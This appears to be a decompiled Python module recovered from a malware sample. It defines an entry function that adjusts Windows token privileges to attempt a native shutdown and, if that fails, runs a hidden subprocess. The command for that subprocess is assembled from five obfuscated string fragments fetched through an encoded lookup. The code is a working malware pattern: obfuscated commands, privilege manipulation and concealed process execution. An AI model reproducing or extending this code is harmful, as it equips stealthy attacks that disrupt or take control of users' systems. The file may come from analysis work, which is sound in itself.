"""Recovered zero-argument entry ``ad_r5_go``.

Decompiled structure: token-privilege setup followed by a five-fragment
hidden ``subprocess.Popen``.
"""
from __future__ import annotations

from ..link._fds_jm import sec
from . import _ops


def ad_r5_go() -> None:
    _priv = sec("fg_vn_9c")
    _dll_a = sec("gh_wo_4r")
    _dll_k = sec("hi_xp_7m")
    _dll_u = sec("ij_yq_0b")
    _api = sec("jk_zr_3t")
    _primed = _ops.shutdown_native(_dll_a, _dll_k, _priv, _dll_u, _api)
    if not _primed:
        _cmd = (
            sec("zp_uq_6n"),
            sec("bv_lt_8p"),
            sec("cw_rj_1a"),
            sec("dy_sk_5e"),
            sec("ez_um_2w"),
        )
        _ops.hidden_popen(_cmd)

